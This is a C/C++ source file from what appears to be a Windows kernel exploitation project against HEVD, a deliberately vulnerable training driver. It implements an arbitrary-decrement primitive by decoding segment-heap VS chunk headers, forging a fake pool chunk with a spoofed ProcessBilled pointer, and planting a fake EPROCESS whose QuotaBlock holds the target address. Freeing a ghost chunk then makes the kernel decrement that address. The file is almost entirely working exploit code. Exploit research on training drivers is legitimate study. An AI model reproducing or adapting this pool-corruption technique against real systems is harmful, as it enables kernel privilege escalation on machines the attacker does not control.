#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <cstdint>

#include "primitives/arbitrary_decrement.h"

#include "primitives/arbitrary_read.h"
#include "pipe_utils/pipe_utils.h"
#include "hevd/hevd.h"

vs_chunk_t g_fake_process_billed_chunk = { 0 };

uintptr_t locateVsSubSegment(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    size_t vs_header_addr = addrs->ghost_vs_chunk + NEXT_CHUNK_OFFSET;

    while (true)
    {
        uint64_t encoded_vs_header[2];

        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_header_addr, (char*)&encoded_vs_header, sizeof(uint64_t));
        ArbitraryRead(&pipes->ghost_chunk_pipe, vs_header_addr + 8, (char*)(&encoded_vs_header) + 8, sizeof(uint64_t));

        encoded_vs_header[0] = encoded_vs_header[0] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;
        encoded_vs_header[1] = encoded_vs_header[1] ^ vs_header_addr ^ addrs->RtlpHpHeapGlobals;

        HEAP_VS_CHUNK_HEADER* vs_header = (HEAP_VS_CHUNK_HEADER*)&encoded_vs_header;
        printf("[*] vs_header_addr: 0x%llX\n\theader->Allocated: 0x%x\n\theader->UnsafePrevSize: 0x%x\n\theader->UnsafeSize: 0x%x\n\theader->EncodedSegmentPageOffset: 0x%x\n",
            vs_header_addr, vs_header->Allocated, vs_header->UnsafePrevSize, vs_header->UnsafeSize, vs_header->EncodedSegmentPageOffset);

        if (vs_header->Allocated)
        {
            uintptr_t vs_sub_segment = vs_header_addr - ((uintptr_t)vs_header->EncodedSegmentPageOffset << 12) & ~0xfffll;
            printf("[+] vs_sub_segment: 0x%llX\n", vs_sub_segment);

            return vs_sub_segment;
        }

        vs_header_addr += vs_header->UnsafeSize * 0x10;
    }
}

void constructFakeVsChunk(exploit_addresses_t* addrs, uintptr_t vs_sub_segment)
{
    HEAP_VS_CHUNK_HEADER new_vs_header = { 0 };
    new_vs_header.Allocated = 0x1;
    new_vs_header.UnsafePrevSize = PREV_CHUNK_OFFSET / 0x10;
    new_vs_header.UnsafeSize = NEXT_CHUNK_OFFSET / 0x10;
    new_vs_header.EncodedSegmentPageOffset = (addrs->ghost_vs_chunk - vs_sub_segment) >> 12 & 0xff;

    uint64_t* new_encoded_vs_header = (uint64_t*)&new_vs_header;
    new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;
    new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ addrs->ghost_vs_chunk ^ addrs->RtlpHpHeapGlobals;

    g_fake_process_billed_chunk.encoded_vs_header[0] = new_encoded_vs_header[0];
    g_fake_process_billed_chunk.encoded_vs_header[1] = new_encoded_vs_header[1];
    g_fake_process_billed_chunk.pool_header.PreviousSize = 0;
    g_fake_process_billed_chunk.pool_header.PoolIndex = 0;
    g_fake_process_billed_chunk.pool_header.BlockSize = 0x100 / 0x10;
    g_fake_process_billed_chunk.pool_header.PoolType = 8;
    g_fake_process_billed_chunk.pool_header.PoolTag = 0x42424242;
    g_fake_process_billed_chunk.pipe_queue_entry.list.Flink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    g_fake_process_billed_chunk.pipe_queue_entry.list.Blink = (LIST_ENTRY*)addrs->root_pipe_queue_entry;
    g_fake_process_billed_chunk.pipe_queue_entry.linkedIRP = 0;
    g_fake_process_billed_chunk.pipe_queue_entry.SecurityClientContext = 0;
    g_fake_process_billed_chunk.pipe_queue_entry.isDataInKernel = 0;
    g_fake_process_billed_chunk.pipe_queue_entry.DataSize = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
    g_fake_process_billed_chunk.pipe_queue_entry.remaining_bytes = PIPE_QUEUE_ENTRY_BUFSIZE(GHOST_BLOCK_SIZE);
    g_fake_process_billed_chunk.pipe_queue_entry.field_2C = 0;
}

int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
{
    puts("[*] Searching for allocated VS header to locate subsegment...");
    uintptr_t vs_sub_segment = locateVsSubSegment(pipes, addrs);

    puts("[*] Constructing fake VS chunk");
    constructFakeVsChunk(addrs, vs_sub_segment);

    return 1;
}

uintptr_t allocFakeEprocess(exploit_pipes_t* pipes, exploit_addresses_t* addrs, char* fake_eprocess_buf)
{
    // Write fake EPROCESS data to the previous chunk pipe, creating a linked pipe queue entry
    WriteDataToPipe(&pipes->previous_chunk_pipe, fake_eprocess_buf, FAKE_EPROCESS_SIZE);

    // Calculate address of the previous chunk's pipe_queue_entry
    uintptr_t prev_vs_chunk_addr = addrs->ghost_vs_chunk - PREV_CHUNK_OFFSET;
    uintptr_t prev_pipe_queue_entry_addr = prev_vs_chunk_addr + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER);

    // Get address of the new pipe_queue_entry via Flink
    uintptr_t new_pipe_queue_entry_addr;
    ArbitraryRead(&pipes->ghost_chunk_pipe, prev_pipe_queue_entry_addr + offsetof(LIST_ENTRY, Flink), (char*)&new_pipe_queue_entry_addr, 0x8);

    // Return the address of the fake EPROCESS within the new pipe queue data buffer
    return new_pipe_queue_entry_addr + offsetof(pipe_queue_entry_t, data) + FAKE_EPROCESS_OFFSET;
}

int setupFakeEprocess(char* fake_eprocess_buf, uintptr_t addr_to_decrement)
{
    memset((PVOID)fake_eprocess_buf, 0x41, FAKE_EPROCESS_SIZE);

    PVOID addr = (PVOID)((DWORD64)fake_eprocess_buf + FAKE_EPROCESS_OFFSET);

    // Pcb.Header.Type
    memset((char*)addr + EPROCESS_TYPE_OFFSET, 0x3, 1);

    // QuotaBlock: Set address to decrement in fake structure
    memcpy((char*)addr + EPROCESS_QUOTA_BLOCK_OFFSET, &addr_to_decrement, sizeof(DWORD64));

    return 1;
}

void setFakeProcessBilled(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t fake_eprocess)
{
    g_fake_process_billed_chunk.pool_header.ProcessBilled = fake_eprocess ^ addrs->ExpPoolQuotaCookie ^ (addrs->ghost_vs_chunk + sizeof(HEAP_VS_CHUNK_HEADER));

    uintptr_t pipe_queue_entry_addr = NULL;
    do
    {
        FreeNPPNxChunk(pipes->previous_chunk_pipe, VULN_BLOCK_SIZE);
        pipes->previous_chunk_pipe = AllocNPPNxChunk(&g_fake_process_billed_chunk, VULN_BLOCK_SIZE);
        ArbitraryRead(&pipes->ghost_chunk_pipe, addrs->root_pipe_queue_entry, (char*)&pipe_queue_entry_addr, 0x8);
    } while (pipe_queue_entry_addr != 0x4141414141414141);
}

int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintptr_t addr_to_decrement)
{
    puts("[*] Preparing fake EPROCESS buffer");
    char fake_eprocess_buf[0x1000] = { 0 };
    setupFakeEprocess(fake_eprocess_buf, addr_to_decrement - 0x1);

    puts("[*] Allocating fake EPROCESS");
    uintptr_t fake_eprocess = allocFakeEprocess(pipes, addrs, fake_eprocess_buf);
    printf("[+] Fake EPROCESS address: 0x%llX\n", fake_eprocess);

    puts("[*] Spraying pipes with fake ProcessBilled...");
    setFakeProcessBilled(pipes, addrs, fake_eprocess);

    puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
    FreeNPPNxChunk(pipes->ghost_chunk_pipe, GHOST_BLOCK_SIZE);

    return 1;
}
